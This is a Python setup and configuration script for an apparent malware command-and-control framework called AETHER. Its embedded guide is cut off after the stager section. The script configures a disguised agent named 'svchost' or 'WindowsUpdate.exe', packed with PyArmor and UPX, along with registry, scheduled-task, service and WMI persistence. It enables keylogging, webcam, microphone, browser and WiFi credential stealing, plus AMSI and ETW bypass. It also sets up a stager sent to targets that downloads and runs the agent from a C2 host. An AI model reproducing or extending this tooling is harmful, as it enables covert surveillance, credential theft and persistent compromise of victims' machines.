#!/usr/bin/env python3
"""
╔═╗╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗ - AETHER C2 Framework
║ ╦╠═╝ ║ ╠═╝║  ║╣ ╠╦╝   Comprehensive Setup & Configuration Tool
╚═╝╩   ╩ ╩  ╩═╝╚═╝╩╚═

This script provides interactive setup and deployment for all AETHER components.
Supports: Server, Agent, Builder, Stager, WhatsApp Bot, and all integrations.
"""

import os
import sys
import json
import subprocess
import platform
import re
from pathlib import Path
from colorama import init, Fore, Back, Style

init(autoreset=True)

class AetherSetup:
    """Main setup orchestrator"""
    
    def __init__(self):
        self.root_dir = Path(__file__).parent
        self.config_file = self.root_dir / 'config.json'
        self.config = self.load_config()
        self.is_windows = platform.system() == 'Windows'
        self.is_linux = platform.system() == 'Linux'
        
    def print_header(self, title):
        """Print styled header"""
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.YELLOW}{title:^70}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
    
    def print_section(self, title):
        """Print section title"""
        print(f"\n{Fore.GREEN}▶ {title}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'-'*70}{Style.RESET_ALL}")
    
    def print_info(self, msg):
        print(f"{Fore.BLUE}ℹ {msg}{Style.RESET_ALL}")
    
    def print_success(self, msg):
        print(f"{Fore.GREEN}✓ {msg}{Style.RESET_ALL}")
    
    def print_error(self, msg):
        print(f"{Fore.RED}✗ {msg}{Style.RESET_ALL}")
    
    def print_warning(self, msg):
        print(f"{Fore.YELLOW}⚠ {msg}{Style.RESET_ALL}")
    
    def load_config(self):
        """Load configuration from config.json"""
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                self.print_error(f"Failed to load config: {e}")
        return {}
    
    def save_config(self):
        """Save configuration to config.json"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            self.print_success("Configuration saved")
            return True
        except Exception as e:
            self.print_error(f"Failed to save config: {e}")
            return False
    
    def run_command(self, cmd, shell=True, capture=False):
        """Run system command"""
        try:
            if capture:
                result = subprocess.run(cmd, shell=shell, capture_output=True, text=True)
                return result.returncode, result.stdout, result.stderr
            else:
                result = subprocess.run(cmd, shell=shell)
                return result.returncode, '', ''
        except Exception as e:
            self.print_error(f"Command failed: {e}")
            return 1, '', str(e)
    
    def prompt_input(self, prompt, default=None, validate=None):
        """Get user input with optional validation"""
        while True:
            if default:
                display = f"{prompt} [{default}]: "
            else:
                display = f"{prompt}: "
            
            user_input = input(f"{Fore.CYAN}{display}{Style.RESET_ALL}").strip()
            
            if not user_input and default:
                return default
            
            if user_input:
                if validate:
                    if validate(user_input):
                        return user_input
                    else:
                        self.print_error("Invalid input. Try again.")
                        continue
                return user_input
    
    def main_menu(self):
        """Display main menu"""
        self.print_header("AETHER C2 Framework - Setup & Configuration")
        
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Configure C2 Server")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Configure Agent")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Configure Builder")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Configure Stager")
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Configure WhatsApp Bot")
        print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} Install Dependencies")
        print(f"{Fore.YELLOW}[7]{Style.RESET_ALL} Run Components")
        print(f"{Fore.YELLOW}[8]{Style.RESET_ALL} View Full Configuration Guide")
        print(f"{Fore.YELLOW}[9]{Style.RESET_ALL} Validate All Configurations")
        print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} Exit")
        
        choice = self.prompt_input("Select option")
        return choice
    
    # ===== C2 SERVER CONFIGURATION =====
    
    def configure_c2_server(self):
        """Configure C2 Server settings"""
        self.print_section("C2 Server Configuration")
        
        # Initialize section if not exists
        if 'c2' not in self.config:
            self.config['c2'] = {}
        
        print("\n📋 Current C2 Server Settings:")
        print(f"  Primary Host: {self.config['c2'].get('primary_host', 'NOT SET')}")
        print(f"  Primary Port: {self.config['c2'].get('primary_port', 'NOT SET')}")
        
        print("\n⚙️  Configuration Options:")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Set Primary Host")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Set Primary Port")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Configure Encryption Key")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Configure Beacon Settings")
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Configure Multi-Channel C2")
        print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} Back to Main Menu")
        
        choice = self.prompt_input("Select option")
        
        if choice == '1':
            host = self.prompt_input("Primary C2 Host (FQDN or IP)", 
                                    default=self.config['c2'].get('primary_host', 'localhost'))
            self.config['c2']['primary_host'] = host
            self.print_success(f"Primary host set to: {host}")
        
        elif choice == '2':
            port = self.prompt_input("Primary C2 Port", 
                                    default=str(self.config['c2'].get('primary_port', 443)),
                                    validate=lambda x: x.isdigit() and 1 <= int(x) <= 65535)
            self.config['c2']['primary_port'] = int(port)
            self.print_success(f"Primary port set to: {port}")
        
        elif choice == '3':
            self.configure_encryption_key()
        
        elif choice == '4':
            self.configure_beacon_settings()
        
        elif choice == '5':
            self.configure_multi_channel()
        
        if choice != '6':
            self.save_config()
            self.configure_c2_server()  # Recursive menu
    
    def configure_encryption_key(self):
        """Configure encryption settings"""
        self.print_section("Encryption Configuration")
        
        current_key = self.config.get('encryption_key', 'CHANGE_THIS_TO_RANDOM_64_CHAR_STRING_IN_PRODUCTION')
        
        if current_key.startswith('CHANGE_THIS'):
            self.print_warning("⚠️  Using default encryption key! Change immediately for production!")
        
        print(f"\n📌 Current Key (first 20 chars): {current_key[:20]}...")
        
        print("\n🔑 Encryption Options:")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Generate New Random Key (64 chars)")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Enter Custom Key")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Keep Current Key")
        
        choice = self.prompt_input("Select option")
        
        if choice == '1':
            import random
            import string
            new_key = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
            self.config['encryption_key'] = new_key
            self.print_success("New encryption key generated")
            print(f"Key: {new_key}")
            print(f"{Fore.RED}⚠️  Save this key securely!{Style.RESET_ALL}")
        
        elif choice == '2':
            key = self.prompt_input("Enter custom encryption key (min 32 chars)", 
                                   validate=lambda x: len(x) >= 32)
            self.config['encryption_key'] = key
            self.print_success("Encryption key configured")
        
        self.save_config()
    
    def configure_beacon_settings(self):
        """Configure beacon intervals and behavior"""
        self.print_section("Beacon Configuration")
        
        if 'beacon' not in self.config:
            self.config['beacon'] = {}
        
        print(f"\n📊 Current Beacon Settings:")
        print(f"  Interval: {self.config['beacon'].get('interval', 30)} seconds")
        print(f"  Jitter: {self.config['beacon'].get('jitter', 5)} seconds")
        print(f"  Adaptive: {self.config['beacon'].get('adaptive', True)}")
        
        interval = self.prompt_input("Beacon interval (seconds)", 
                                    default=str(self.config['beacon'].get('interval', 30)),
                                    validate=lambda x: x.isdigit() and int(x) > 0)
        self.config['beacon']['interval'] = int(interval)
        
        jitter = self.prompt_input("Beacon jitter (seconds)", 
                                  default=str(self.config['beacon'].get('jitter', 5)),
                                  validate=lambda x: x.isdigit() and int(x) >= 0)
        self.config['beacon']['jitter'] = int(jitter)
        
        self.print_success("Beacon settings configured")
        self.save_config()
    
    def configure_multi_channel(self):
        """Configure multiple C2 channels"""
        self.print_section("Multi-Channel C2 Configuration")
        
        if 'universal_c2' not in self.config:
            self.config['universal_c2'] = {'enabled': False, 'channels': []}
        
        enable = self.prompt_input("Enable multi-channel C2? (y/n)", default='n')
        self.config['universal_c2']['enabled'] = enable.lower() == 'y'
        
        if self.config['universal_c2']['enabled']:
            print("\n📡 Channel Types:")
            print("  1. HTTPS Direct")
            print("  2. Domain Fronting")
            print("  3. DNS Tunneling")
            
            self.print_info("Each agent will try channels in order until one works")
        
        self.save_config()
    
    # ===== AGENT CONFIGURATION =====
    
    def configure_agent(self):
        """Configure agent settings"""
        self.print_section("Agent Configuration")
        
        if 'agent' not in self.config:
            self.config['agent'] = {}
        
        print("\n🤖 Current Agent Settings:")
        print(f"  Name: {self.config['agent'].get('name', 'svchost')}")
        print(f"  Persistence: {len(self.config['agent'].get('persistence_methods', []))} methods")
        
        print("\n⚙️  Configuration Options:")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Set Agent Name")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Configure Persistence Methods")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Configure Intelligence Modules")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Configure Evasion Techniques")
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Back to Main Menu")
        
        choice = self.prompt_input("Select option")
        
        if choice == '1':
            name = self.prompt_input("Agent display name", 
                                    default=self.config['agent'].get('name', 'svchost'))
            self.config['agent']['name'] = name
            self.print_success(f"Agent name set to: {name}")
        
        elif choice == '2':
            self.configure_persistence()
        
        elif choice == '3':
            self.configure_intelligence_modules()
        
        elif choice == '4':
            self.configure_evasion()
        
        if choice != '5':
            self.save_config()
            self.configure_agent()
    
    def configure_persistence(self):
        """Configure persistence methods"""
        self.print_section("Persistence Methods Configuration")
        
        if 'agent' not in self.config:
            self.config['agent'] = {}
        
        methods = self.config['agent'].get('persistence_methods', ['registry', 'scheduled_task'])
        
        print(f"\n✓ Available Persistence Methods:")
        available = ['registry', 'scheduled_task', 'service', 'wmi', 'run_key', 'startup_folder']
        
        for i, method in enumerate(available, 1):
            status = "✓" if method in methods else "○"
            print(f"  {status} {i}. {method}")
        
        enable = self.prompt_input("\nEnable all standard persistence? (y/n)", default='y')
        if enable.lower() == 'y':
            self.config['agent']['persistence_methods'] = available[:4]  # registry, scheduled_task, service, wmi
            self.print_success("Persistence methods enabled")
        
        self.save_config()
    
    def configure_intelligence_modules(self):
        """Configure intelligence gathering modules"""
        self.print_section("Intelligence Modules Configuration")
        
        modules = {
            'keylogger': 'Keyboard input logging',
            'screenshot': 'Screen capture',
            'webcam': 'Webcam recording',
            'audio': 'Audio recording',
            'browser': 'Browser credential stealing',
            'wifi': 'WiFi credentials',
            'clipboard': 'Clipboard monitoring',
        }
        
        if 'modules' not in self.config:
            self.config['modules'] = {}
        
        print("\n📷 Available Intelligence Modules:")
        enabled = self.config['modules'].get('enabled', [])
        
        for i, (name, desc) in enumerate(modules.items(), 1):
            status = "✓" if name in enabled else "○"
            print(f"  {status} {i}. {name:12} - {desc}")
        
        print("\nℹ️  High-risk modules (webcam, audio) may trigger warnings")
        
        enable_all = self.prompt_input("Enable all modules? (y/n)", default='y')
        if enable_all.lower() == 'y':
            self.config['modules']['enabled'] = list(modules.keys())
            self.print_success("All modules enabled")
        
        self.save_config()
    
    def configure_evasion(self):
        """Configure evasion techniques"""
        self.print_section("Evasion Techniques Configuration")
        
        techniques = {
            'amsi_bypass': 'AMSI bypass',
            'etw_bypass': 'ETW bypass',
            'sandbox_detection': 'Sandbox detection',
            'vm_detection': 'VM detection',
            'debugger_detection': 'Debugger detection',
            'sleep_obfuscation': 'Sleep obfuscation',
        }
        
        if 'evasion' not in self.config:
            self.config['evasion'] = {}
        
        print("\n🛡️  Available Evasion Techniques:")
        enabled = self.config['evasion'].get('enabled', [])
        
        for i, (name, desc) in enumerate(techniques.items(), 1):
            status = "✓" if name in enabled else "○"
            print(f"  {status} {i}. {desc}")
        
        enable_all = self.prompt_input("Enable all evasion techniques? (y/n)", default='y')
        if enable_all.lower() == 'y':
            self.config['evasion']['enabled'] = list(techniques.keys())
            self.print_success("Evasion techniques enabled")
        
        self.save_config()
    
    # ===== BUILDER CONFIGURATION =====
    
    def configure_builder(self):
        """Configure builder settings"""
        self.print_section("Builder Configuration")
        
        if 'builder' not in self.config:
            self.config['builder'] = {}
        
        print("\n🔨 Current Builder Settings:")
        print(f"  Output Name: {self.config['builder'].get('output_name', 'svchost.exe')}")
        print(f"  Use PyArmor: {self.config['builder'].get('use_pyarmor', True)}")
        print(f"  Use UPX: {self.config['builder'].get('use_upx', True)}")
        
        print("\n⚙️  Configuration Options:")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Set Output Executable Name")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Toggle PyArmor Obfuscation")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Toggle UPX Compression")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Set Icon File")
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Back to Main Menu")
        
        choice = self.prompt_input("Select option")
        
        if choice == '1':
            name = self.prompt_input("Output executable name", 
                                    default=self.config['builder'].get('output_name', 'svchost.exe'))
            self.config['builder']['output_name'] = name
            self.print_success(f"Output name set to: {name}")
        
        elif choice == '2':
            current = self.config['builder'].get('use_pyarmor', True)
            self.config['builder']['use_pyarmor'] = not current
            status = "enabled" if not current else "disabled"
            self.print_success(f"PyArmor obfuscation {status}")
        
        elif choice == '3':
            current = self.config['builder'].get('use_upx', True)
            self.config['builder']['use_upx'] = not current
            status = "enabled" if not current else "disabled"
            self.print_success(f"UPX compression {status}")
        
        elif choice == '4':
            icon_path = self.prompt_input("Icon file path", 
                                         default=self.config['builder'].get('icon_path', ''))
            self.config['builder']['icon_path'] = icon_path
            self.print_success(f"Icon set to: {icon_path}")
        
        if choice != '5':
            self.save_config()
            self.configure_builder()
    
    # ===== STAGER CONFIGURATION =====
    
    def configure_stager(self):
        """Configure stager settings"""
        self.print_section("Stager Configuration")
        
        if 'stager' not in self.config:
            self.config['stager'] = {}
        
        print("\n📥 Current Stager Settings:")
        print(f"  Config URL: {self.config['stager'].get('config_url', 'NOT SET')}")
        print(f"  Agent URL: {self.config['stager'].get('agent_url', 'NOT SET')}")
        
        print("\n⚙️  Configuration Options:")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Set Config URL")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Set Agent Download URL")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Back to Main Menu")
        
        choice = self.prompt_input("Select option")
        
        if choice == '1':
            url = self.prompt_input("Config URL (accessible from targets)", 
                                   default=self.config['stager'].get('config_url', 
                                          f"https://{self.config['c2'].get('primary_host', 'localhost')}/config.json"))
            self.config['stager']['config_url'] = url
            self.print_success(f"Config URL set to: {url}")
        
        elif choice == '2':
            url = self.prompt_input("Agent download URL", 
                                   default=self.config['stager'].get('agent_url', 
                                          f"https://{self.config['c2'].get('primary_host', 'localhost')}/agent.exe"))
            self.config['stager']['agent_url'] = url
            self.print_success(f"Agent URL set to: {url}")
        
        if choice != '3':
            self.save_config()
            self.configure_stager()
    
    # ===== WHATSAPP BOT CONFIGURATION =====
    
    def configure_whatsapp(self):
        """Configure WhatsApp bot settings"""
        self.print_section("WhatsApp Bot Configuration")
        
        if 'whatsapp' not in self.config:
            self.config['whatsapp'] = {}
        
        print("\n💬 Current WhatsApp Settings:")
        print(f"  Bot URL: {self.config['whatsapp'].get('bot_url', 'NOT SET')}")
        print(f"  Auth Password: {'SET' if self.config['whatsapp'].get('auth_password') else 'NOT SET'}")
        print(f"  Authorized Users: {len(self.config['whatsapp'].get('authorized_users', []))} users")
        
        print("\n⚙️  Configuration Options:")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Set Bot URL")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Set Authentication Password")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Manage Authorized Users")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Configure Bot Features")
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Back to Main Menu")
        
        choice = self.prompt_input("Select option")
        
        if choice == '1':
            url = self.prompt_input("Bot URL (http://localhost:3000)", 
                                   default=self.config['whatsapp'].get('bot_url', 'http://localhost:3000'))
            self.config['whatsapp']['bot_url'] = url
            self.print_success(f"Bot URL set to: {url}")
        
        elif choice == '2':
            pwd = self.prompt_input("Authentication password (min 8 chars)", 
                                   validate=lambda x: len(x) >= 8)
            self.config['whatsapp']['auth_password'] = pwd
            self.print_success("Authentication password configured")
        
        elif choice == '3':
            self.manage_whatsapp_users()
            return  # Don't re-enter menu
        
        elif choice == '4':
            self.configure_whatsapp_features()
            return
        
        if choice != '5':
            self.save_config()
            self.configure_whatsapp()
    
    def manage_whatsapp_users(self):
        """Manage WhatsApp authorized users"""
        self.print_section("Manage Authorized WhatsApp Users")
        
        users = self.config['whatsapp'].get('authorized_users', [])
        
        print(f"\n👥 Current Authorized Users ({len(users)}):")
        if users:
            for i, user in enumerate(users, 1):
                print(f"  {i}. {user}")
        else:
            print(f"  {Fore.YELLOW}(none){Style.RESET_ALL}")
        
        print("\n⚙️  Options:")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Add User")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Remove User")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Back")
        
        choice = self.prompt_input("Select option")
        
        if choice == '1':
            phone = self.prompt_input("WhatsApp phone number (e.g., +1234567890)", 
                                     validate=lambda x: x.startswith('+') and x[1:].isdigit())
            if phone not in users:
                users.append(phone)
                self.config['whatsapp']['authorized_users'] = users
                self.save_config()
                self.print_success(f"User added: {phone}")
            else:
                self.print_warning(f"User already exists: {phone}")
        
        elif choice == '2':
            if not users:
                self.print_warning("No users to remove")
                return
            
            idx = self.prompt_input("User number to remove", 
                                   validate=lambda x: x.isdigit() and 1 <= int(x) <= len(users))
            removed = users.pop(int(idx) - 1)
            self.config['whatsapp']['authorized_users'] = users
            self.save_config()
            self.print_success(f"User removed: {removed}")
        
        if choice != '3':
            self.manage_whatsapp_users()
        else:
            self.configure_whatsapp()
    
    def configure_whatsapp_features(self):
        """Configure WhatsApp bot features"""
        self.print_section("WhatsApp Bot Features")
        
        features = {
            'enable_command_history': 'Command history logging',
            'enable_session_linking': 'Session linking',
            'enable_file_transfer': 'File transfer',
            'enable_batch_commands': 'Batch command execution',
        }
        
        if 'features' not in self.config['whatsapp']:
            self.config['whatsapp']['features'] = {}
        
        print("\n✨ Available Features:")
        for feature, desc in features.items():
            enabled = self.config['whatsapp']['features'].get(feature, True)
            status = "✓" if enabled else "○"
            print(f"  {status} {desc}")
        
        for feature in features:
            enable = self.prompt_input(f"Enable {features[feature]}? (y/n)", default='y')
            self.config['whatsapp']['features'][feature] = enable.lower() == 'y'
        
        self.save_config()
        self.print_success("Features configured")
        self.configure_whatsapp()
    
    # ===== DEPENDENCY INSTALLATION =====
    
    def install_dependencies(self):
        """Install project dependencies"""
        self.print_section("Dependency Installation")
        
        print("\n📦 Components to install:")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Python dependencies (requirements.txt)")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Node.js dependencies (WA-BOT-Base/)")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Install all")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Back to Main Menu")
        
        choice = self.prompt_input("Select option")
        
        if choice in ('1', '3'):
            self.install_python_deps()
        
        if choice in ('2', '3'):
            self.install_node_deps()
        
        if choice != '4':
            self.install_dependencies()
    
    def install_python_deps(self):
        """Install Python dependencies"""
        print(f"\n{Fore.BLUE}Installing Python dependencies...{Style.RESET_ALL}")
        
        req_file = self.root_dir / 'requirements.txt'
        if not req_file.exists():
            self.print_error(f"requirements.txt not found at {req_file}")
            return
        
        cmd = f"pip install -r {req_file}"
        code, stdout, stderr = self.run_command(cmd)
        
        if code == 0:
            self.print_success("Python dependencies installed")
        else:
            self.print_error(f"Installation failed: {stderr}")
    
    def install_node_deps(self):
        """Install Node.js dependencies"""
        print(f"\n{Fore.BLUE}Installing Node.js dependencies...{Style.RESET_ALL}")
        
        bot_dir = self.root_dir / 'WA-BOT-Base'
        if not bot_dir.exists():
            self.print_error(f"WA-BOT-Base directory not found")
            return
        
        # Check if npm is available
        code, _, _ = self.run_command("npm --version", capture=True)
        if code != 0:
            self.print_error("npm not found. Install Node.js first.")
            return
        
        cmd = f"cd {bot_dir} && npm install"
        code, stdout, stderr = self.run_command(cmd)
        
        if code == 0:
            self.print_success("Node.js dependencies installed")
        else:
            self.print_error(f"Installation failed: {stderr}")
    
    # ===== RUN COMPONENTS =====
    
    def run_components(self):
        """Menu to run various components"""
        self.print_section("Run Components")
        
        print("\n▶️  Available Components:")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Start AETHER C2 Server")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Start WhatsApp Bot (Baileys)")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Build Agent")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Run Integration Tests")
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Start All Components (Interactive)")
        print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} Back to Main Menu")
        
        choice = self.prompt_input("Select option")
        
        if choice == '1':
            self.run_server()
        elif choice == '2':
            self.run_bot()
        elif choice == '3':
            self.build_agent()
        elif choice == '4':
            self.run_tests()
        elif choice == '5':
            self.run_all_interactive()
    
    def run_server(self):
        """Run AETHER C2 Server"""
        print(f"\n{Fore.BLUE}Starting AETHER C2 Server...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Press Ctrl+C to stop{Style.RESET_ALL}\n")
        
        cmd = f"cd {self.root_dir} && python3 server/aether_server.py"
        self.run_command(cmd, shell=True, capture=False)
    
    def run_bot(self):
        """Run WhatsApp Bot"""
        print(f"\n{Fore.BLUE}Starting WhatsApp Bot...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Press Ctrl+C to stop{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Scan the QR code with WhatsApp to link the bot{Style.RESET_ALL}\n")
        
        bot_dir = self.root_dir / 'WA-BOT-Base'
        cmd = f"cd {bot_dir} && npm start"
        self.run_command(cmd, shell=True, capture=False)
    
    def build_agent(self):
        """Build agent executable"""
        print(f"\n{Fore.BLUE}Building AETHER Agent...{Style.RESET_ALL}\n")
        
        cmd = f"cd {self.root_dir} && python3 builder/compile.py"
        code, stdout, stderr = self.run_command(cmd, capture=True)
        
        if code == 0:
            self.print_success("Agent built successfully")
            print(f"Output:\n{stdout}")
        else:
            self.print_error(f"Build failed:\n{stderr}")
    
    def run_tests(self):
        """Run integration tests"""
        print(f"\n{Fore.BLUE}Running Integration Tests...{Style.RESET_ALL}\n")
        
        cmd = f"cd {self.root_dir} && python3 test_files.py"
        code, stdout, stderr = self.run_command(cmd, capture=True)
        
        print(stdout)
        if stderr:
            print(f"{Fore.YELLOW}Warnings:\n{stderr}{Style.RESET_ALL}")
        
        if code == 0:
            self.print_success("All tests passed")
        else:
            self.print_error("Some tests failed")
    
    def run_all_interactive(self):
        """Run all components interactively"""
        self.print_section("Running All Components")
        
        print(f"\n{Fore.CYAN}This will start the C2 server and bot in parallel{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}You'll need multiple terminal windows for this{Style.RESET_ALL}\n")
        
        print("💡 Instructions:")
        print("1. Server: python3 server/aether_server.py")
        print("2. Bot: cd WA-BOT-Base && npm start")
        print("3. Enable WhatsApp in server: AETHER> whatsapp enable")
        print("4. Connect via WhatsApp: Send 'auth <password>'")
        
        self.print_info("Start servers in separate terminals")
    
    # ===== VALIDATION & GUIDE =====
    
    def validate_configurations(self):
        """Validate all configurations"""
        self.print_section("Configuration Validation")
        
        issues = []
        
        # Check C2
        if not self.config.get('c2', {}).get('primary_host'):
            issues.append("C2 primary host not set")
        if not self.config.get('c2', {}).get('primary_port'):
            issues.append("C2 primary port not set")
        if self.config.get('encryption_key', '').startswith('CHANGE_THIS'):
            issues.append("⚠️  Encryption key still has default value (insecure!)")
        
        # Check Agent
        if not self.config.get('agent', {}).get('persistence_methods'):
            issues.append("Agent persistence methods not configured")
        
        # Check Builder
        if not self.config.get('builder', {}).get('output_name'):
            issues.append("Builder output name not set")
        
        # Check Stager
        if not self.config.get('stager', {}).get('config_url'):
            issues.append("Stager config URL not set")
        
        # Check WhatsApp
        if not self.config.get('whatsapp', {}).get('auth_password'):
            issues.append("WhatsApp auth password not set")
        if not self.config.get('whatsapp', {}).get('authorized_users'):
            issues.append("⚠️  No WhatsApp authorized users configured")
        
        # Report
        if not issues:
            self.print_success("✅ All configurations valid!")
            return True
        else:
            print(f"\n{Fore.RED}Configuration issues found:{Style.RESET_ALL}")
            for issue in issues:
                print(f"  ✗ {issue}")
            return False
    
    def show_full_guide(self):
        """Show comprehensive configuration guide"""
        self.print_header("AETHER C2 Framework - Full Configuration Guide")
        
        guide = """
╔════════════════════════════════════════════════════════════════════════════╗
║                         COMPLETE CONFIGURATION GUIDE                       ║
╚════════════════════════════════════════════════════════════════════════════╝

┌─ 1. C2 SERVER CONFIGURATION ─────────────────────────────────────────────┐
│                                                                             │
│ File: config.json (section: "c2")                                         │
│                                                                             │
│ Required Settings:                                                         │
│   • primary_host: Your C2 server FQDN or IP address                      │
│   • primary_port: Listening port (default 443)                           │
│   • encryption_key: 64-character encryption key (MUST change!)           │
│                                                                             │
│ Example:                                                                   │
│   "c2": {                                                                 │
│     "primary_host": "c2.example.com",                                   │
│     "primary_port": 443,                                                 │
│     "protocol": "https"                                                  │
│   }                                                                       │
│                                                                             │
│ Multi-Channel C2 (Optional):                                             │
│   Enable in universal_c2.enabled to support:                            │
│   • HTTPS Direct connections                                             │
│   • Domain Fronting (bypass firewalls)                                  │
│   • DNS Tunneling (covert channels)                                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ 2. AGENT CONFIGURATION ──────────────────────────────────────────────────┐
│                                                                             │
│ File: config.json (section: "agent")                                      │
│                                                                             │
│ Key Settings:                                                             │
│   • name: Display name (e.g., "svchost" for Windows)                    │
│   • persistence_methods: Array of persistence techniques                 │
│   • modules: Intelligence gathering capabilities                         │
│   • evasion: Anti-detection techniques                                  │
│                                                                             │
│ Persistence Methods (WINDOWS):                                           │
│   ✓ registry: Windows registry (HKLM/HKCU)                             │
│   ✓ scheduled_task: Windows Task Scheduler                             │
│   ✓ service: Windows Service installation                              │
│   ✓ wmi: WMI event subscriptions                                       │
│   ✓ run_key: HKCU\\Software\\Microsoft\\Windows\\Run                  │
│   ✓ startup_folder: %APPDATA%\\Microsoft\\Windows\\Start Menu          │
│                                                                             │
│ Example Configuration:                                                    │
│   "agent": {                                                             │
│     "name": "svchost",                                                  │
│     "persistence_methods": ["registry", "scheduled_task", "service"],  │
│     "modules": {                                                         │
│       "keylogger": true,                                                │
│       "screenshot": true,                                               │
│       "webcam": false,                                                  │
│       "audio": false                                                    │
│     }                                                                    │
│   }                                                                      │
│                                                                             │
│ Intelligence Modules:                                                     │
│   • keylogger: Capture keyboard input                                   │
│   • screenshot: Visual reconnaissance                                   │
│   • webcam: Camera access                                               │
│   • audio: Microphone recording                                         │
│   • browser: Cookie/password stealing                                   │
│   • wifi: WiFi credential extraction                                    │
│   • clipboard: Monitor clipboard                                        │
│                                                                             │
│ Evasion Techniques:                                                       │
│   • amsi_bypass: Bypass Windows Antimalware Scan Interface             │
│   • etw_bypass: Disable Event Tracing for Windows                      │
│   • sandbox_detection: Detect analysis environment                     │
│   • vm_detection: Detect virtual machines                              │
│   • debugger_detection: Detect debugging tools                         │
│   • sleep_obfuscation: Hide sleep calls from analysis                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ 3. BUILDER CONFIGURATION ────────────────────────────────────────────────┐
│                                                                             │
│ File: config.json (section: "builder")                                   │
│                                                                             │
│ Build Options:                                                            │
│   • output_name: Executable filename (default: "svchost.exe")           │
│   • use_pyarmor: Enable code obfuscation (recommended)                  │
│   • use_upx: Enable binary compression                                  │
│   • icon_path: Custom icon file path                                    │
│   • obfuscation_level: "low", "medium", "high"                         │
│                                                                             │
│ Build Process:                                                            │
│   1. Python source → PyArmor obfuscation                                │
│   2. Obfuscated code → PyInstaller bundling                            │
│   3. Bundle → UPX compression                                           │
│   4. Output: Standalone .exe                                           │
│                                                                             │
│ Example:                                                                  │
│   "builder": {                                                           │
│     "output_name": "WindowsUpdate.exe",                                │
│     "use_pyarmor": true,                                               │
│     "use_upx": true,                                                   │
│     "icon_path": "builder/windows.ico",                                │
│     "obfuscation_level": "high"                                        │
│   }                                                                      │
│                                                                             │
│ How to Build:                                                            │
│   python3 builder/compile.py                                           │
│                                                                             │
│ Output:                                                                   │
│   build_{timestamp}_{random}/dist/svchost.exe                          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ 4. STAGER CONFIGURATION ────────────────────────────────────────────────┐
│                                                                             │
│ File: config.json (section: "stager")                                    │
│                                                                             │
│ Purpose: Small download stub that retrieves main agent                  │
│                                                                             │
│ Required URLs:                                                            │
│   • config_url: Where stager gets agent config                         │
│   • agent_url: Where stager downloads main agent                       │
│                                                                             │
│ Example:                                                                  │
│   "stager": {                                                            │
│     "config_url": "https://c2.example.com/config.json",               │
│     "agent_url": "https://c2.example.com/agent.exe"                   │
│   }                                                                      │
│                                                                             │
│ Deployment:                                                              │
│   1. Host config.json and agent.exe on C2 server                       │
│   2. Distribute stager executable to targets                           │
│   3. Stager downloads and executes main agent                          │
│                                                                             │
│ Benefits:                                                                 │
│   • Stager is smaller and stealthier                                   │
│   • Easy to update agent without rebuilding stager                     │
│   • Can serve different configs per target                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

